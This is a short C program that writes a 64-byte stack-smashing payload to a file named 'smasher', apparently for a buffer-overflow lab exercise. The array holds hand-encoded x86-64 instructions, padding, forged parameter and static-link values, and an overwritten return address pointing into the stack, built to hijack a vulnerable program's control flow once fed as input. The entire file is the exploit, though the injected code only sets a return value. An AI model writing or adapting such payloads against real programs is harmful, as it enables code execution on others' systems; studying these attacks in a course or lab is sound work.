#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static char code[64] = { 
                       0xc7, 0x85, 0x54, 0xfe, 0xff, 0xff, 0x42, 0x00, 0x00, 0x00,  // movl	$666, -428(%rbp)
                       0x8b, 0x85, 0x54, 0xfe, 0xff, 0xff,                          // movl	-428(%rbp), %eax
                       0x48, 0x81, 0xc4, 0xb0, 0x01, 0x00, 0x00,                    // addq	$432, %rsp
                       0x5d, // popq	%rbp
                       0xc3,  // retq
		       0,0,0,0,0,0,0,
		       0,0,0,0,0,0,0,0,                                             // parameter (int)
		       0xa0, 0xf3, 0xbf, 0xef, 0xfe, 0x7f, 0x0, 0x0,                // parameter (char *)
		       0x40, 0xf5, 0xbf, 0xef, 0xfe, 0x7f, 0x0, 0x0,                // static link 
		       0x50,0xf3,0xbf,0xef,0xfe,0x7f,0x0,0x0                        // return address
};

int main(int argc, const char * argv[])
{ 
    FILE *badfile;
    badfile = fopen("smasher", "w");
    fwrite(code, sizeof(char), sizeof(code), badfile);
    printf("SIZE=%lu\n",sizeof(code));
  return 0;
}
